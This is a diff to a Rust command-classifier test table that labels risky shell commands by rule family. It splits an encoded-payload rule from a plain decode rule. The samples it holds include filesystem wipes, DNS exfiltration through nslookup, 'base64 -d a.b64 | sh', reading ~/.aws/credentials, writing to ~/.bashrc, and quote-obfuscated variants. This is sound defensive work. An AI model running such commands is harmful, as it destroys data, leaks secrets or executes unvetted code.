@@ -27,7 +27,7 @@ const STAGE_FAMILIES: [(&str, &str); 8] = [
 ];
 
 /// Rules read from the whole command field, which still holds comment text.
-const FIELD_FAMILIES: [(&str, &str); 11] = [
+const FIELD_FAMILIES: [(&str, &str); 12] = [
     ("destructive.filesystem_wipe", "rm -rf /"),
     ("destructive.git_discard", "git reset --hard"),
     ("destructive.database_drop", "dropdb app"),
@@ -36,7 +36,8 @@ const FIELD_FAMILIES: [(&str, &str); 11] = [
         "exfil.dns_encoding",
         "base64 notes.txt | nslookup example.invalid",
     ),
-    ("execution.encoded_payload", "base64 -d a.b64"),
+    ("execution.encoded_payload", "base64 -d a.b64 | sh"),
+    ("obfuscation.decode", "base64 -d a.b64"),
     ("credential.cloud_harvest", "cat ~/.aws/credentials"),
     ("persistence.shell_profile", "echo x >> ~/.bashrc"),
     ("supply_chain.publish", "npm publish"),
@@ -1134,8 +1135,8 @@ fn a_quote_inside_a_script_or_a_substitution_is_taken_off() {
         ("destructive.infrastructure_teardown", "terraform d'e'stroy"),
         ("supply_chain.publish", "bash -c \"npm pub'l'ish\""),
         ("supply_chain.publish", "npm pub'l'ish"),
-        ("execution.encoded_payload", "bash -c \"base64 -'d' a.b64\""),
-        ("execution.encoded_payload", "base64 -'d' a.b64"),
+        ("obfuscation.decode", "bash -c \"base64 -'d' a.b64\""),
+        ("execution.encoded_payload", "base64 -'d' a.b64 | sh"),
     ] {
         assert!(reader.rules(command).contains(rule), "{rule}: {command:?}");
     }
